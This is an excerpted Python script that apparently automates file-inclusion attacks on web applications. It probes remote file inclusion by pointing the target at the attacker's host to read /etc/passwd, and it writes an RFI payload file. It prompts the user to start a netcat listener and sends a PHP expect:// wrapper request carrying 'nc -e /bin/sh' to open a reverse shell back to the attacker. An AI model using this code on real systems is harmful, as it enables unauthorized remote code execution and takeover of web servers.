    ...
    if c == 200:
        if "On the face" and "of this culture exist to this day" and "of this culture exist to this day" in respuesta:
            ...
            if "Nordic Walking Pluspunkte" and "ller Muskeln beteilig" in ress2:
                ...
                url_tercera_r = url + 'http://' + ip_locall + ':1221/etc/passwd'
                ...
                if url_tercera_r_code == 200:
                    ...
                    if "root" and "bin" and "sbin" in text_tercera_r:
                        ...
                        commandoo = 'echo pendrive >> /home/' + userr + '/s12ingame'
                        os.system(commandoo)
                        intenting = url + 'http://' + ip_locall + ':1221/s12ingame'
...
def exploiter():    
    ...
    nc_listenerrr = print(f"{bcolors.WARNING}Put the command (nc -vv -l -p 1212) in new terminal{bcolors.RESET}")
    nc_question = str.lower(input(f"{bcolors.FAIL}You put this command (nc -vv -l -p 1212) in new terminal?   y/n: {bcolors.RESET}"))
    if nc_question == "y":
        ...
        if nullbyte_q == "y":
            ...
            url_pettitionn = linkk + 'HTtP://' + ippppppp + ':1221/script_rfi_.txt?'
...
def crear_file_home():
    payload_final = payload + ippppppp + payload2
    file1212 = "script_rfi_.txt"
    path = '/home/' + uuserr
    Ruta = os.path.join(path,file1212)
    file1 = open(Ruta, "w")   
    payload_final = payload + ippppppp + payload2
...
def input_php():
    print(linea)
    print(f"{bcolors.WARNING}Put the command (nc -vv -l -p 1212) in other terminal{bcolors.RESET}")
...
def wrapper_expect():
    ...
    if ncccc == "y":
        ...
        local_ip = input("Put your Local IP: ")
        coki = {'Cookie':'PHPSESSID=s12cookie'}
        commanddd = 'nc -e /bin/sh ' + local_ip +  ' 1212'
        link2 = link + 'expect://' + commanddd
        print(link2)
        a1212 = requests.get(link2)
    elif ncccc == "n":
        print("Put the command...")
    else:
        print("Invalid Option")
